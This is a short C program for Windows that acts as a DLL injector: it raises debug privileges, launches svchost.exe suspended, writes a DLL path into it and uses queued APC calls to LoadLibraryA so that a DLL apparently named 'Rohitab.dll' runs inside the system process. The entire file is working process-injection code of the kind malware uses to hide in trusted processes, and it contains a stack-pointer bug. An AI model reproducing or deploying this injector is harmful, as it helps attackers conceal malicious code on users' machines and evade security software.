#include <Windows.h>
#include <Tlhelp32.h>
#include <Shlwapi.h>
#include <Tchar.h>
 
char g_szInjectorPath[MAX_PATH] = "";
char szTarget[] = "svchost.exe";
char szTarget_BIG[] = "SVCHOST.EXE";
//===========================================================================
#define CREATE_THREAD_ACCESS (PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ) 
//===========================================================================
char* szGetDirFile(char* szFileName)
{
char szTemp[MAX_PATH] = "";
 
if(wsprintf(szTemp, "%s%s", g_szInjectorPath, szFileName))
{
return szTemp;
}
 
return "";
}
//=============================================================================
BOOL bInjectLibrary(char* szDllToInjectPath)
{
STARTUPINFO si={};
PROCESS_INFORMATION pi={};
 
CreateProcess(NULL, szTarget, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
LPVOID lpRemoteAddress = VirtualAllocEx(pi.hProcess, NULL, strlen(szDllToInjectPath), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
if(!lpRemoteAddress)
return FALSE;
 
if(!WriteProcessMemory(pi.hProcess, lpRemoteAddress, (LPVOID)szDllToInjectPath, strlen(szDllToInjectPath), NULL))
return FALSE;
 
DWORD dwResult = NULL;
 
if(!(dwResult = QueueUserAPC((PAPCFUNC)GetProcAddress(GetModuleHandle("KERNEL32.DLL"),"LoadLibraryA"), pi.hThread, (ULONG_PTR)lpRemoteAddress)))
return FALSE;
 
if(!(dwResult = QueueUserAPC((PAPCFUNC)GetProcAddress(GetModuleHandle("KERNEL32.DLL"),"ExitThread"), pi.hThread, 0)))
return FALSE;
 
ResumeThread(pi.hThread);
CloseHandle(pi.hThread);
CloseHandle(pi.hProcess);
 
return TRUE;
}
//=============================================================================
int _tmain(int argc, _TCHAR* argv[])
{
TOKEN_PRIVILEGES TPLEGES;
 
TPLEGES.PrivilegeCount=1;
TPLEGES.Privileges->Luid.LowPart=0x00000014;
TPLEGES.Privileges->Luid.HighPart=0x00000000;
TPLEGES.Privileges->Attributes=0x00000002;
HANDLE htoken;
OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &htoken);
AdjustTokenPrivileges(htoken,0,&TPLEGES,0,0,0);
 
GetModuleFileName(NULL, g_szInjectorPath, MAX_PATH);
 
char* pos = g_szInjectorPath + strlen(g_szInjectorPath);
while(pos >= g_szInjectorPath && *pos != '\\') --pos;
pos[1] = 0;
 
if(!bInjectLibrary(szGetDirFile("Rohitab.dll")))
{
}
 
return 1;
}
//=============================================================================
